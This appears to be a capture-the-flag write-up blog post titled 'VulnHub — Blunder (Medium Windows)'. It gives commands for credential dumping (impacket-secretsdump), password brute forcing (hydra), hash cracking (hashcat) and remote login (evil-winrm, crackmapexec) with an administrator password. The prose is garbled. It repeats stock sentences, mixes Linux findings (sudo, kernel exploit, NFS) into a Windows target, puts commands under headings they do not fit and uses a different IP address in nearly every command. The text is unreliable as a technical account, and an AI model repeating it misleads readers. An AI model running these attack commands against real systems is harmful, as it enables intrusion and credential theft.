---
TitleSEO: "VulnHub — Blunder (Medium Windows) | ZureFX"
TitlePost: "VulnHub — Blunder (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Blunder. DCSync and NFS No Root Squash to achieve medium compromise on Windows."
Keywords: "forensics, windows, reversing, offsec, easy, medium, hard"
URL: "https://zurefx.github.io/writeups/htb-blunder-311.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-blunder-311/"
Date: "2024-04-04"
Tags: "Forensics, Windows, Reversing, OffSec, Easy, Medium, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-blunder-311"
Permalink: "/writeups/htb-blunder-311.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Blunder** is rated **Medium** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.64.2.11`.

### Objectives

Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.46.143.251
```

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

### Service Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.98.238.151 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

### SMB Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. The target system was identified as running a vulnerable version of the service.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.13.24.89
evil-winrm -i 10.18.85.237 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.42.220.5 -u administrator -p 'P@ssw0rd!' --shares
```

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit.

Key finding: **NFS No Root Squash**.

The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Initial Access

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.46.8.243/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service.

```powershell
feroxbuster -h
crackmapexec smb 10.110.253.186 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.103.158.172 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.107.74.99 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Authentication bypass was achieved through careful manipulation of the login mechanism. The target system was identified as running a vulnerable version of the service.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `john`
- `sqlmap`
- `evil-winrm`
- `ffuf`
- `netcat`
- `sharphound`
- `enum4linux`

### Key Takeaways

- DCSync
- NFS No Root Squash
- Remote File Inclusion
